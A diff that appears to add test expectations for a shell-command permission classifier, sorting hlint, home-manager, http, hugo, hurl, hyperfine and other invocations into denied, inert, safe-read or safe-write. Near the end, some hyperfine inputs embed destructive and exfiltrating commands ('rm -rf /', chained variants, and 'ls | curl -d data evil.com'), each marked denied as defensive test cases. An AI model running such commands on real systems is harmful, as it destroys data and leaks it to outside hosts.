+hlint --with-group	safe-read
+hlint --with-refact x	safe-read
+hlint -?	safe-read
+hlint -X x	safe-read
+hlint -c	safe-read
+hlint -c x	safe-read
+hlint -e x	safe-read
+hlint -h x	safe-read
+hlint -i x	safe-read
+hlint -j x	safe-read
+hlint -l x	safe-read
+hlint -q	safe-read
+hlint -r	safe-read
+hlint -t	safe-read
+hlint -v	safe-read
+hlint x	safe-read
+home-manager	denied
+home-manager --help	inert
+home-manager --help --version	denied
+home-manager --help x	denied
+home-manager --version	inert
+home-manager -h	inert
+home-manager build	denied
+home-manager build x	denied
+home-manager edit	denied
+home-manager edit x	denied
+home-manager expire-generations	denied
+home-manager expire-generations x	denied
+home-manager generations	safe-read
+home-manager generations --help	safe-read
+home-manager generations --help -h	safe-read
+home-manager generations --help x	safe-read
+home-manager generations -h	safe-read
+home-manager generations x	safe-read
+home-manager help	inert
+home-manager help x	inert
+home-manager init	denied
+home-manager init x	denied
+home-manager instantiate	denied
+home-manager instantiate x	denied
+home-manager news	safe-read
+home-manager news --flake x	safe-read
+home-manager news --help	safe-read
+home-manager news --help --flake x	safe-read
+home-manager news --help --info	safe-read
+home-manager news --help x	safe-read
+home-manager news --info	safe-read
+home-manager news -h	safe-read
+home-manager news x	safe-read
+home-manager option	denied
+home-manager option --flake x	safe-read
+home-manager option --help	safe-read
+home-manager option --help --flake x	safe-read
+home-manager option --help -h	safe-read
+home-manager option --help x	safe-read
+home-manager option -h	safe-read
+home-manager option x	safe-read
+home-manager packages	safe-read
+home-manager packages --help	safe-read
+home-manager packages --help -h	safe-read
+home-manager packages --help x	safe-read
+home-manager packages -h	safe-read
+home-manager packages x	safe-read
+home-manager remove-generations	denied
+home-manager remove-generations x	denied
+home-manager switch	denied
+home-manager switch x	denied
+home-manager uninstall	denied
+home-manager uninstall x	denied
+home-manager x	denied
+host	denied
+host --help	inert
+host --help --version	inert
+host --help -D x	inert
+host --help x	inert
+host --version	inert
+host -4	inert
+host -6	inert
+host -C	inert
+host -D x	inert
+host -N x	inert
+host -R x	inert
+host -T x	inert
+host -V	inert
+host -W x	inert
+host -a	inert
+host -c	inert
+host -d	inert
+host -h	inert
+host -i x	inert
+host -l	inert
+host -m x	inert
+host -r	inert
+host -s	inert
+host -t x	inert
+host -v	inert
+host example.com	inert
+host x	inert
+hostid	inert
+hostid --help	inert
+hostid --help --version	inert
+hostid --help x	denied
+hostid --version	inert
+hostid x	denied
+hostinfo	inert
+hostinfo --help	denied
+hostinfo --version	denied
+hostinfo x	denied
+hostname	inert
+hostname --help	inert
+hostname --help --version	inert
+hostname --help x	denied
+hostname --version	inert
+hostname -A	inert
+hostname -I	inert
+hostname -V	inert
+hostname -d	inert
+hostname -f	inert
+hostname -h	inert
+hostname -i	inert
+hostname -s	inert
+hostname x	denied
+hpmdiagnose	inert
+hpmdiagnose --help	denied
+hpmdiagnose --version	denied
+hpmdiagnose x	denied
+htmlq	denied
+htmlq --attribute x	inert
+htmlq --base x	inert
+htmlq --detect-base	inert
+htmlq --detect-base --attribute x	inert
+htmlq --detect-base --help	inert
+htmlq --detect-base x	inert
+htmlq --filename x	inert
+htmlq --help	inert
+htmlq --ignore-whitespace	inert
+htmlq --output x	inert
+htmlq --pretty	inert
+htmlq --remove-nodes	inert
+htmlq --text	inert
+htmlq --version	inert
+htmlq -B	inert
+htmlq -V	inert
+htmlq -a x	inert
+htmlq -b x	inert
+htmlq -f x	inert
+htmlq -h	inert
+htmlq -o x	inert
+htmlq -p	inert
+htmlq -t	inert
+htmlq -w	inert
+htmlq x	inert
+htmltree	denied
+htmltree --help	denied
+htmltree --version	denied
+htmltree -h	inert
+htmltree -h -w	inert
+htmltree -h x	inert
+htmltree -w	inert
+htmltree page.html	inert
+htmltree x	inert
+htop	inert
+htop --delay x	inert
+htop --filter x	inert
+htop --help	inert
+htop --help --delay x	inert
+htop --help --no-color	inert
+htop --help x	denied
+htop --highlight-changes x	inert
+htop --no-color	inert
+htop --no-mouse	inert
+htop --no-unicode	inert
+htop --pid x	inert
+htop --sort-key x	inert
+htop --tree	inert
+htop --user x	inert
+htop --version	inert
+htop -C	inert
+htop -F x	inert
+htop -H	inert
+htop -M	inert
+htop -V	inert
+htop -d x	inert
+htop -h	inert
+htop -p x	inert
+htop -s x	inert
+htop -t	inert
+htop -u x	inert
+htop x	denied
+http	denied
+http --all	safe-read
+http --all --auth x	safe-read
+http --all --body	safe-read
+http --all x	safe-read
+http --auth x	safe-read
+http --auth-type x	safe-read
+http --bearer x	safe-read
+http --body	safe-read
+http --cert x	safe-read
+http --cert-key x	safe-read
+http --cert-key-pass x	safe-read
+http --check-status	safe-read
+http --chunked x	safe-read
+http --compress x	safe-read
+http --continue	safe-read
+http --debug	safe-read
+http --default-scheme	safe-read
+http --default-scheme x	safe-read
+http --download	safe-write
+http --follow	safe-read
+http --form	safe-read
+http --format-options x	safe-read
+http --headers	safe-read
+http --help	safe-read
+http --ignore-netrc	safe-read
+http --ignore-stdin	safe-read
+http --json	safe-read
+http --max-headers x	safe-read
+http --max-redirects x	safe-read
+http --meta	safe-read
+http --multipart	safe-read
+http --no-stream	safe-read
+http --offline	safe-read
+http --output	safe-write
+http --output x	safe-write
+http --overwrite	safe-read
+http --path-as-is x	safe-read
+http --pretty	safe-read
+http --print	safe-read
+http --proxy x	safe-read
+http --quiet	safe-read
+http --response-charset x	safe-read
+http --response-mime x	safe-read
+http --session x	safe-read
+http --session-read-only x	safe-read
+http --ssl x	safe-read
+http --stream	safe-read
+http --style	safe-read
+http --timeout x	safe-read
+http --traceback	safe-read
+http --verbose	safe-read
+http --verify	safe-read
+http --version	safe-read
+http -A x	safe-read
+http -F	safe-read
+http -I	safe-read
+http -S	safe-read
+http -a x	safe-read
+http -b	safe-read
+http -c	safe-read
+http -d	safe-write
+http -f	safe-read
+http -h	safe-read
+http -j	safe-read
+http -m	safe-read
+http -o	safe-write
+http -p	safe-read
+http -q	safe-read
+http -s	safe-read
+http -v	safe-read
+http -x x	safe-read
+http x	safe-read
+http-server	denied
+http-server --help	inert
+http-server --help --version	inert
+http-server --help x	denied
+http-server --version	inert
+http-server -h	inert
+http-server -v	inert
+http-server x	denied
+https	denied
+https --all	safe-read
+https --all --auth x	safe-read
+https --all --body	safe-read
+https --all x	safe-read
+https --auth x	safe-read
+https --auth-type x	safe-read
+https --bearer x	safe-read
+https --body	safe-read
+https --cert x	safe-read
+https --cert-key x	safe-read
+https --cert-key-pass x	safe-read
+https --check-status	safe-read
+https --chunked x	safe-read
+https --compress x	safe-read
+https --continue	safe-read
+https --debug	safe-read
+https --default-scheme	safe-read
+https --default-scheme x	safe-read
+https --download	safe-write
+https --follow	safe-read
+https --form	safe-read
+https --format-options x	safe-read
+https --headers	safe-read
+https --help	safe-read
+https --ignore-netrc	safe-read
+https --ignore-stdin	safe-read
+https --json	safe-read
+https --max-headers x	safe-read
+https --max-redirects x	safe-read
+https --meta	safe-read
+https --multipart	safe-read
+https --no-stream	safe-read
+https --offline	safe-read
+https --output	safe-write
+https --output x	safe-write
+https --overwrite	safe-read
+https --path-as-is x	safe-read
+https --pretty	safe-read
+https --print	safe-read
+https --proxy x	safe-read
+https --quiet	safe-read
+https --response-charset x	safe-read
+https --response-mime x	safe-read
+https --session x	safe-read
+https --session-read-only x	safe-read
+https --ssl x	safe-read
+https --stream	safe-read
+https --style	safe-read
+https --timeout x	safe-read
+https --traceback	safe-read
+https --verbose	safe-read
+https --verify	safe-read
+https --version	safe-read
+https -A x	safe-read
+https -F	safe-read
+https -I	safe-read
+https -S	safe-read
+https -a x	safe-read
+https -b	safe-read
+https -c	safe-read
+https -d	safe-write
+https -f	safe-read
+https -h	safe-read
+https -j	safe-read
+https -m	safe-read
+https -o	safe-write
+https -p	safe-read
+https -q	safe-read
+https -s	safe-read
+https -v	safe-read
+https -x x	safe-read
+https x	safe-read
+httpyac	denied
+httpyac --help	inert
+httpyac --help --version	inert
+httpyac --help x	denied
+httpyac --version	inert
+httpyac -h	inert
+httpyac -v	inert
+httpyac x	denied
+huggingface-cli	denied
+huggingface-cli --help	inert
+huggingface-cli --help --version	denied
+huggingface-cli --help x	denied
+huggingface-cli --version	inert
+huggingface-cli -h	inert
+huggingface-cli -v	inert
+huggingface-cli auth	denied
+huggingface-cli auth x	denied
+huggingface-cli delete-cache	denied
+huggingface-cli delete-cache x	denied
+huggingface-cli delete-repo	denied
+huggingface-cli delete-repo x	denied
+huggingface-cli download	denied
+huggingface-cli download x	denied
+huggingface-cli env	inert
+huggingface-cli env --help	inert
+huggingface-cli env --help -h	inert
+huggingface-cli env --help x	inert
+huggingface-cli env -h	inert
+huggingface-cli env x	inert
+huggingface-cli help	inert
+huggingface-cli help x	inert
+huggingface-cli lfs-enable-largefiles	denied
+huggingface-cli lfs-enable-largefiles x	denied
+huggingface-cli lfs-multipart-upload	denied
+huggingface-cli lfs-multipart-upload x	denied
+huggingface-cli login	denied
+huggingface-cli login x	denied
+huggingface-cli logout	denied
+huggingface-cli logout x	denied
+huggingface-cli repo	denied
+huggingface-cli repo x	denied
+huggingface-cli repo-files	denied
+huggingface-cli repo-files x	denied
+huggingface-cli scan-cache	safe-read
+huggingface-cli scan-cache --dir x	safe-read
+huggingface-cli scan-cache --help	safe-read
+huggingface-cli scan-cache --help --dir x	safe-read
+huggingface-cli scan-cache --help --verbose	safe-read
+huggingface-cli scan-cache --help x	safe-read
+huggingface-cli scan-cache --verbose	safe-read
+huggingface-cli scan-cache -h	safe-read
+huggingface-cli scan-cache -v	safe-read
+huggingface-cli scan-cache x	safe-read
+huggingface-cli system	denied
+huggingface-cli system x	denied
+huggingface-cli tag	denied
+huggingface-cli tag x	denied
+huggingface-cli upload	denied
+huggingface-cli upload x	denied
+huggingface-cli upload-large-folder	denied
+huggingface-cli upload-large-folder x	denied
+huggingface-cli user	denied
+huggingface-cli user x	denied
+huggingface-cli version	inert
+huggingface-cli version --help	inert
+huggingface-cli version --help -h	inert
+huggingface-cli version --help x	inert
+huggingface-cli version -h	inert
+huggingface-cli version x	inert
+huggingface-cli whoami	safe-read
+huggingface-cli whoami --help	safe-read
+huggingface-cli whoami --help --token x	safe-read
+huggingface-cli whoami --help -h	safe-read
+huggingface-cli whoami --help x	safe-read
+huggingface-cli whoami --token x	safe-read
+huggingface-cli whoami -h	safe-read
+huggingface-cli whoami x	safe-read
+huggingface-cli x	denied
+hugo	denied
+hugo --destination x	denied
+hugo --help	inert
+hugo --help --destination x	denied
+hugo --help --version	denied
+hugo --help x	denied
+hugo --version	inert
+hugo -V	inert
+hugo -h	inert
+hugo build	safe-write
+hugo build --baseURL x	safe-write
+hugo build --cacheDir x	safe-write
+hugo build --cleanDestinationDir	safe-write
+hugo build --cleanDestinationDir --baseURL x	safe-write
+hugo build --cleanDestinationDir --clock	safe-write
+hugo build --cleanDestinationDir x	safe-write
+hugo build --clock	safe-write
+hugo build --clock x	safe-write
+hugo build --config	safe-write
+hugo build --configDir	safe-write
+hugo build --contentDir x	safe-write
+hugo build --debug	safe-write
+hugo build --destination	safe-write
+hugo build --destination x	safe-write
+hugo build --disableFastRender	safe-write
+hugo build --enableGitInfo	safe-write
+hugo build --environment x	safe-write
+hugo build --forceSyncStatic	safe-write
+hugo build --gc	safe-write
+hugo build --help	safe-write
+hugo build --i18n x	safe-write
+hugo build --ignoreCache	safe-write
+hugo build --layoutDir x	safe-write
+hugo build --logFile x	safe-write
+hugo build --logLevel x	safe-write
+hugo build --memstats x	safe-write
+hugo build --minify	safe-write
+hugo build --noBuildLock	safe-write
+hugo build --noChmod	safe-write
+hugo build --noChmod x	safe-write
+hugo build --noTimes	safe-write
+hugo build --noTimes x	safe-write
+hugo build --panicOnWarning x	safe-write
+hugo build --printI18nWarnings	safe-write
+hugo build --printMemoryUsage	safe-write
+hugo build --printPathWarnings	safe-write
+hugo build --printUnusedTemplates	safe-write
+hugo build --quiet	safe-write
+hugo build --renderToMemory	safe-write
+hugo build --source x	safe-write
+hugo build --templateMetrics	safe-write
+hugo build --templateMetricsHints	safe-write
+hugo build --theme x	safe-write
+hugo build --themesDir x	safe-write
+hugo build --trace	safe-write
+hugo build --verbose	safe-write
+hugo build --workers x	safe-write
+hugo build -D	safe-write
+hugo build -E	safe-write
+hugo build -F	safe-write
+hugo build -b x	safe-write
+hugo build -d	safe-write
+hugo build -e	safe-write
+hugo build -h	safe-write
+hugo build -l x	safe-write
+hugo build -q	safe-write
+hugo build -s	safe-write
+hugo build -t	safe-write
+hugo build -v	safe-write
+hugo build x	safe-write
+hugo check	inert
+hugo check ulimit	inert
+hugo check ulimit --help	inert
+hugo check ulimit --help -h	inert
+hugo check ulimit --help x	inert
+hugo check ulimit -h	inert
+hugo check ulimit x	inert
+hugo check x	denied
+hugo completion	denied
+hugo completion --help	inert
+hugo completion --help -h	inert
+hugo completion --help x	inert
+hugo completion -h	inert
+hugo completion x	inert
+hugo config	inert
+hugo config --help	inert
+hugo config --help -h	inert
+hugo config --help x	denied
+hugo config -h	inert
+hugo config mounts	inert
+hugo config mounts --help	inert
+hugo config mounts --help -h	inert
+hugo config mounts --help x	inert
+hugo config mounts -h	inert
+hugo config mounts x	inert
+hugo config print	inert
+hugo config print --help	inert
+hugo config print --help -h	inert
+hugo config print --help x	inert
+hugo config print -h	inert
+hugo config print x	inert
+hugo config x	denied
+hugo convert	denied
+hugo convert x	denied
+hugo deploy	denied
+hugo deploy x	denied
+hugo env	inert
+hugo env --help	inert
+hugo env --help -h	inert
+hugo env --help x	inert
+hugo env -h	inert
+hugo env x	inert
+hugo gen	denied
+hugo gen autocomplete	inert
+hugo gen autocomplete --completionfile x	inert
+hugo gen autocomplete --help	inert
+hugo gen autocomplete --help --completionfile x	inert
+hugo gen autocomplete --help --type	inert
+hugo gen autocomplete --help x	inert
+hugo gen autocomplete --type	inert
+hugo gen autocomplete --type x	inert
+hugo gen autocomplete -h	inert
+hugo gen autocomplete x	inert
+hugo gen chromastyles	inert
+hugo gen chromastyles --help	inert
+hugo gen chromastyles --help --highlightStyle x	inert
+hugo gen chromastyles --help -h	inert
+hugo gen chromastyles --help x	inert
+hugo gen chromastyles --highlightStyle x	inert
+hugo gen chromastyles --lineNumbersInlineStyle x	inert
+hugo gen chromastyles --linesStyle x	inert
+hugo gen chromastyles --style x	inert
+hugo gen chromastyles -h	inert
+hugo gen chromastyles x	inert
+hugo gen docs	inert
+hugo gen docs --dir x	inert
+hugo gen docs --help	inert
+hugo gen docs --help --dir x	inert
+hugo gen docs --help -h	inert
+hugo gen docs --help x	inert
+hugo gen docs -h	inert
+hugo gen docs x	inert
+hugo gen man	inert
+hugo gen man --dir x	inert
+hugo gen man --help	inert
+hugo gen man --help --dir x	inert
+hugo gen man --help -h	inert
+hugo gen man --help x	inert
+hugo gen man -h	inert
+hugo gen man x	inert
+hugo gen x	denied
+hugo help	inert
+hugo help x	inert
+hugo import	denied
+hugo import x	denied
+hugo list	inert
+hugo list all	inert
+hugo list all --help	inert
+hugo list all --help --source x	inert
+hugo list all --help -h	inert
+hugo list all --help x	inert
+hugo list all --source x	inert
+hugo list all -h	inert
+hugo list all -s x	inert
+hugo list all x	inert
+hugo list drafts	inert
+hugo list drafts --help	inert
+hugo list drafts --help --source x	inert
+hugo list drafts --help -h	inert
+hugo list drafts --help x	inert
+hugo list drafts --source x	inert
+hugo list drafts -h	inert
+hugo list drafts -s x	inert
+hugo list drafts x	inert
+hugo list expired	inert
+hugo list expired --help	inert
+hugo list expired --help --source x	inert
+hugo list expired --help -h	inert
+hugo list expired --help x	inert
+hugo list expired --source x	inert
+hugo list expired -h	inert
+hugo list expired -s x	inert
+hugo list expired x	inert
+hugo list future	inert
+hugo list future --help	inert
+hugo list future --help --source x	inert
+hugo list future --help -h	inert
+hugo list future --help x	inert
+hugo list future --source x	inert
+hugo list future -h	inert
+hugo list future -s x	inert
+hugo list future x	inert
+hugo list published	inert
+hugo list published --help	inert
+hugo list published --help --source x	inert
+hugo list published --help -h	inert
+hugo list published --help x	inert
+hugo list published --source x	inert
+hugo list published -h	inert
+hugo list published -s x	inert
+hugo list published x	inert
+hugo list x	denied
+hugo mod	denied
+hugo mod x	denied
+hugo new	denied
+hugo new --config x	safe-write
+hugo new --editor x	safe-write
+hugo new --force	safe-write
+hugo new --force --config x	safe-write
+hugo new --force --help	safe-write
+hugo new --force x	safe-write
+hugo new --help	safe-write
+hugo new --kind x	safe-write
+hugo new --quiet	safe-write
+hugo new --source x	safe-write
+hugo new -c x	safe-write
+hugo new -f	safe-write
+hugo new -h	safe-write
+hugo new -s x	safe-write
+hugo new x	safe-write
+hugo serve	denied
+hugo serve x	denied
+hugo server	denied
+hugo server x	denied
+hugo version	inert
+hugo version --help	inert
+hugo version --help -h	inert
+hugo version --help x	inert
+hugo version -h	inert
+hugo version x	inert
+hugo x	denied
+hunspell	denied
+hunspell --help	inert
+hunspell --help --version	inert
+hunspell --help -d x	inert
+hunspell --help x	inert
+hunspell --version	inert
+hunspell -1	inert
+hunspell -D	inert
+hunspell -G	inert
+hunspell -H	inert
+hunspell -L	inert
+hunspell -O	inert
+hunspell -P	inert
+hunspell -X	inert
+hunspell -a	inert
+hunspell -d x	inert
+hunspell -h	inert
+hunspell -i x	inert
+hunspell -l	inert
+hunspell -m	inert
+hunspell -n	inert
+hunspell -o x	inert
+hunspell -p x	inert
+hunspell -r	inert
+hunspell -s	inert
+hunspell -t	inert
+hunspell -u	inert
+hunspell -v	inert
+hunspell -w	inert
+hunspell -x	inert
+hunspell x	inert
+hurl	denied
+hurl --aws-sigv4 x	safe-read
+hurl --cacert x	safe-read
+hurl --cert x	safe-read
+hurl --color	safe-read
+hurl --color --aws-sigv4 x	safe-read
+hurl --color --compressed	safe-read
+hurl --color x	safe-read
+hurl --compressed	safe-read
+hurl --connect-timeout x	safe-read
+hurl --connect-to	safe-read
+hurl --connect-to x	safe-read
+hurl --continue-on-error	safe-read
+hurl --cookie x	safe-read
+hurl --cookie-jar	safe-read
+hurl --cookie-jar x	safe-read
+hurl --curl	safe-read
+hurl --debug	safe-read
+hurl --delay x	safe-read
+hurl --digest	safe-read
+hurl --error-format	safe-read
+hurl --error-format x	safe-read
+hurl --file-root	safe-read
+hurl --file-root x	safe-read
+hurl --from-entry	safe-read
+hurl --from-entry x	safe-read
+hurl --glob	safe-read
+hurl --glob x	safe-read
+hurl --help	safe-read
+hurl --http1.0	safe-read
+hurl --http1.1	safe-read
+hurl --http2	safe-read
+hurl --http3	safe-read
+hurl --include	safe-read
+hurl --insecure	safe-read
+hurl --interactive	safe-read
+hurl --ipv4	safe-read
+hurl --ipv6	safe-read
+hurl --jobs x	safe-read
+hurl --json	safe-read
+hurl --key x	safe-read
+hurl --limit-rate x	safe-read
+hurl --location	safe-read
+hurl --location-trusted	safe-read
+hurl --max-filesize	safe-read
+hurl --max-filesize x	safe-read
+hurl --max-redirs	safe-read
+hurl --max-redirs x	safe-read
+hurl --max-time	safe-read
+hurl --max-time x	safe-read
+hurl --negotiate	safe-read
+hurl --netrc	safe-read
+hurl --netrc-file	safe-read
+hurl --netrc-file x	safe-read
+hurl --netrc-optional	safe-read
+hurl --no-assert	safe-read
+hurl --no-color	safe-read
+hurl --no-cookie-store	safe-read
+hurl --no-output	safe-read
+hurl --no-pretty	safe-read
+hurl --no-proxy x	safe-read
+hurl --ntlm	safe-read
+hurl --output	safe-read
+hurl --output x	safe-read
+hurl --parallel	safe-read
+hurl --parallel x	safe-read
+hurl --path-as-is	safe-read
+hurl --pinnedpubkey x	safe-read
+hurl --pretty	safe-read
+hurl --progress-bar	safe-read
+hurl --proxy	safe-read
+hurl --proxy x	safe-read
+hurl --repeat	safe-read
+hurl --repeat x	safe-read
+hurl --report-html	safe-read
+hurl --report-html x	safe-read
+hurl --report-html-history	safe-read
+hurl --report-json	safe-read
+hurl --report-junit	safe-read
+hurl --report-junit x	safe-read
+hurl --report-tap	safe-read
+hurl --report-tap x	safe-read
+hurl --resolve	safe-read
+hurl --resolve x	safe-read
+hurl --retry	safe-read
+hurl --retry x	safe-read
+hurl --retry-interval	safe-read
+hurl --retry-interval x	safe-read
+hurl --secret x	safe-read
+hurl --secrets-file x	safe-read
+hurl --socks5 x	safe-read
+hurl --ssl-no-revoke	safe-read
+hurl --summary	safe-read
+hurl --test	safe-read
+hurl --to-entry	safe-read
+hurl --to-entry x	safe-read
+hurl --unix-socket	safe-read
+hurl --unix-socket x	safe-read
+hurl --user	safe-read
+hurl --user x	safe-read
+hurl --user-agent	safe-read
+hurl --user-agent x	safe-read
+hurl --variable	safe-read
+hurl --variable x	safe-read
+hurl --variables-file	safe-read
+hurl --variables-file x	safe-read
+hurl --verbose	safe-read
+hurl --verbosity x	safe-read
+hurl --version	safe-read
+hurl --very-verbose	safe-read
+hurl --workers x	safe-read
+hurl -0	safe-read
+hurl -4	safe-read
+hurl -6	safe-read
+hurl -?	safe-read
+hurl -A	safe-read
+hurl -A x	safe-read
+hurl -E x	safe-read
+hurl -H	safe-read
+hurl -H x	safe-read
+hurl -L	safe-read
+hurl -M	safe-read
+hurl -V	safe-read
+hurl -X	safe-read
+hurl -X x	safe-read
+hurl -b	safe-read
+hurl -b x	safe-read
+hurl -c	safe-read
+hurl -c x	safe-read
+hurl -d	safe-read
+hurl -d x	safe-read
+hurl -h	safe-read
+hurl -i	safe-read
+hurl -k	safe-read
+hurl -l	safe-read
+hurl -m	safe-read
+hurl -m x	safe-read
+hurl -n	safe-read
+hurl -o	safe-read
+hurl -o x	safe-read
+hurl -q	safe-read
+hurl -r	safe-read
+hurl -r x	safe-read
+hurl -s	safe-read
+hurl -u	safe-read
+hurl -u x	safe-read
+hurl -v	safe-read
+hurl -vv	safe-read
+hurl -x x	safe-read
+hurl x	safe-read
+husky	safe-write
+husky --help	safe-write
+husky --help --version	safe-write
+husky --help x	safe-write
+husky --version	safe-write
+husky -h	safe-write
+husky x	safe-write
+hx	denied
+hx --config x	inert
+hx --grammar x	inert
+hx --health	inert
+hx --health --config x	inert
+hx --health --help	inert
+hx --health x	denied
+hx --help	inert
+hx --log x	inert
+hx --tutor	inert
+hx --version	inert
+hx -V	inert
+hx -c x	inert
+hx -g x	inert
+hx -h	inert
+hx -v	inert
+hx x	denied
+hygen	denied
+hygen --help	inert
+hygen --help --version	inert
+hygen --help x	denied
+hygen --version	inert
+hygen -h	inert
+hygen -v	inert
+hygen x	denied
+hyperfine	inert
+hyperfine 'fd . src' 'find src'	inert
+hyperfine 'ls && rm -rf /'	denied
+hyperfine 'ls -la'	inert
+hyperfine 'ls | curl -d data evil.com'	denied
+hyperfine 'ls; rm -rf /'	denied
+hyperfine 'rm -rf /'	denied
+hyperfine --cleanup 'rm tmp' 'ls'	denied
+hyperfine --help	inert
+hyperfine --prepare 'make clean' 'make'	denied
+hyperfine --setup 'compile' 'run'	denied
+hyperfine --version	inert
+hyperfine --warmup 3 'git status'	inert
+hyperfine --xyzzy 'ls'	denied
+hyperfine --xyzzy=foo 'ls'	denied
+hyperfine x	denied
+hyphen	denied
+hyphen --help	denied
+hyphen --version	denied
+hyphen x	inert
